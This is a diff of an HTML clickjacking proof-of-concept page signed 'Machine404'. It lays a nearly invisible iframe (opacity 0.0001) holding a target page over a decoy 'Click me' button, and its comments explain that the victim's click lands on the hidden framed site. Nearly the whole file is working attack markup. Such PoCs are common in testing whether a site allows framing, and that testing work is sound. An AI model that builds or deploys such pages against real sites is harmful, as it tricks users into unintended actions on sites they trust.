@@ -1,33 +1,67 @@
+<!DOCTYPE html>
 <html>
 <head>
-<title>  ClickJacking POC </title>
-<meta name ="author" content="Machine404">
-<link rel="stylesheet" href="https://fonts.googleapis.com/
-css?family-Righteous">
-</head>
+<title>ClickJacking POC</title>
+<meta name="author" content="Machine404">
+<meta charset="utf-8">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Righteous">
 <style type="text/css">
 body{
-background:white;
-background-color:white;
-height: 90%;
+	background:white;
+	background-color:white;
+	height: 90%;
+	position: relative;
 }
 h1{ font-family: Righteous;
 color: Red;
 }
 * {
-		margin: 0;
-		padding: 0;
-	}
-	
-	.blink{animation:blink 1s infinite}@keyframes blink{to{opacity:.0;}}
+	margin: 0;
+	padding: 0;
+}
+
+.blink{animation:blink 1s infinite}@keyframes blink{to{opacity:.0;}}
+
+/* The decoy sits underneath, visible to the victim. */
+.decoy {
+	position: relative;
+	width: 1000px;
+	margin: 20px auto 0 auto;
+	height: 550px;
+	background: #789;
+}
+.decoy button {
+	position: absolute;
+	left: 53%;
+	bottom: 39%;
+	height: 30px;
+	width: 130px;
+}
+
+/* The real target page is framed on top, made invisible with opacity,
+   so the victim believes they are clicking the decoy button but the
+   click actually lands on the framed page underneath. */
+.target-frame {
+	position: absolute;
+	top: 0;
+	left: 0;
+	width: 1000px;
+	height: 550px;
+	opacity: 0.0001; /* fully transparent but still receives the click */
+	border: none;
+	z-index: 10;
+}
 </style>
+</head>
+<body>
+
+<center> <h1>POC Made By Machine404</h1> </center>
 <br>
-<center> <h1> POC Made By Machine404 </h1> </center>
-<br> </br>
 
-<iframe src="vuln" width="1000" height="550"></iframe>
-<div style="height: 30px;width: 130px;left: 53%;bottom: 39%;background: #789;" class="xss"><button>Click me when you finish :)</button></div>
+<div class="decoy">
+	<button type="button">Click me when you finish :)</button>
+	<iframe class="target-frame" src="vuln" width="1000" height="550"></iframe>
+</div>
 
-
-
+</body>
 </html>
